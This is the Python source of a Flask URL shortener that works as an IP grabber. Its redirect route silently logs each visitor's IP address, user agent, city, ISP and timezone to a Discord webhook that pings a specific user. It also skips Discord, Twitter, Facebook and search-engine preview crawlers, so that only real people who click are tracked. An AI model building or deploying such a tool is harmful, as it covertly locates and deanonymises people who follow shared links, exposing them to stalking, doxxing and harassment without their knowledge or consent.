from flask import Flask, request, redirect, session, url_for, render_template
import json
import string
import random
import requests
import os
from dotenv import load_dotenv
from werkzeug.middleware.proxy_fix import ProxyFix
from timezonefinder import TimezoneFinder

# Load environment variables from .env file
load_dotenv()

app = Flask(__name__)
app.secret_key = os.urandom(24)  # Generate a random secret key

# Trust the proxy headers to get the real client IP address
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_port=1, x_prefix=0)

DATA_FILE = 'data.json'
DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL')

# Authentication credentials from environment variables
USERNAME = os.getenv('URL_SHORTENER_USERNAME')
PASSWORD = os.getenv('URL_SHORTENER_PASSWORD')

# User agents to ignore
IGNORED_USER_AGENTS = [
    "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; AppleWebKit/537.36 (KHTML, like Gecko) DiscordBots/25.1.4 Chrome/102.0.5005.167 Electron/19.0.17 Safari/537.36",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0 (compatible; Googlebot-Image/1.0; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Twitterbot/1.0 (+http://www.twitter.com)",
    "Mozilla/5.0 (compatible; Twitterbot/1.0; +http://www.twitter.com/; @twitterbot)",
    "Googlebot-News",
    "Googlebot-Image",
    "Googlebot-Video",
    "Googlebot-AdsBot",
    "Googlebot-Mobile",
    "BingPreview/1.0 (+http://www.bing.com/bingpreview)",
    "Twitterbot/1.0",
    "Twitterbot/2.0",
]

# Ensure the data file exists
if not os.path.exists(DATA_FILE):
    with open(DATA_FILE, 'w') as f:
        json.dump({"urls": {}}, f)

# Function to load data from the JSON file
def load_data():
    with open(DATA_FILE, 'r') as f:
        return json.load(f)

# Function to save data to the JSON file
def save_data(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=4)

# Function to generate a random string
def generate_short_url():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=6))

# Function to get the real client IP address
def get_client_ip():
    if 'X-Forwarded-For' in request.headers:
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    else:
        return request.remote_addr

# Function to get the timezone based on IP address
def get_timezone(ip):
    geo_response = requests.get(f"http://ip-api.com/json/{ip}")
    geo_data = geo_response.json()
    latitude = geo_data.get('lat', None)
    longitude = geo_data.get('lon', None)
    if latitude is not None and longitude is not None:
        tf = TimezoneFinder()
        return tf.timezone_at(lng=longitude, lat=latitude)
    return 'N/A'

# Function to log IP, user agent, and URL to Discord
def log_to_discord(ip, user_agent, short_path, original_url):
    if user_agent in IGNORED_USER_AGENTS:
        return
    
    original_url_no_https = original_url.replace('https://', '').replace('http://', '')
    short_url = f"<{request.host_url}{short_path}>"
    
    geo_response = requests.get(f"http://ip-api.com/json/{ip}")
    geo_data = geo_response.json()
    
    geo_info = (
        f"Country: {geo_data.get('country', 'N/A')}\n"
        f"Region: {geo_data.get('regionName', 'N/A')}\n"
        f"City: {geo_data.get('city', 'N/A')}\n"
        f"ISP: {geo_data.get('isp', 'N/A')}\n"
        f"Org: {geo_data.get('org', 'N/A')}\n"
        f"AS: {geo_data.get('as', 'N/A')}\n"
    )
    
    timezone = get_timezone(ip)
    
    data = {
        "content": f"<@938005604230918204> IP: {ip}\nUser-Agent: {user_agent}\nShort URL: {short_url}\nOriginal URL: {original_url_no_https}\n\nGeolocation Info:\n{geo_info}\nTimezone: {timezone}"
    }
    
    response = requests.post(DISCORD_WEBHOOK_URL, json=data)
    if response.status_code != 204:
        print(f"Failed to send webhook: {response.status_code}, {response.text}")

# Login route
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username == USERNAME and password == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('index'))
        return 'Invalid credentials', 401
    return render_template('login.html')

# Logout route
@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

# Index route with authentication
@app.route('/', methods=['GET', 'POST'])
def index():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    if request.method == 'POST':
        original_url = request.form['original_url']
        data = load_data()
        short_path = next((k for k, v in data['urls'].items() if v == original_url), None)
        if not short_path:
            short_path = generate_short_url()
            data['urls'][short_path] = original_url
            save_data(data)
        return f"Short URL: {request.host_url}{short_path}"
    
    return render_template('index.html')

@app.route('/<short_path>')
def redirect_url(short_path):
    data = load_data()
    if short_path in data['urls']:
        original_url = data['urls'][short_path]
        ip = get_client_ip()
        user_agent = request.headers.get('User-Agent')
        log_to_discord(ip, user_agent, short_path, original_url)
        return redirect(original_url)
    return "URL not found", 404

if __name__ == '__main__':
    app.run(debug=True)
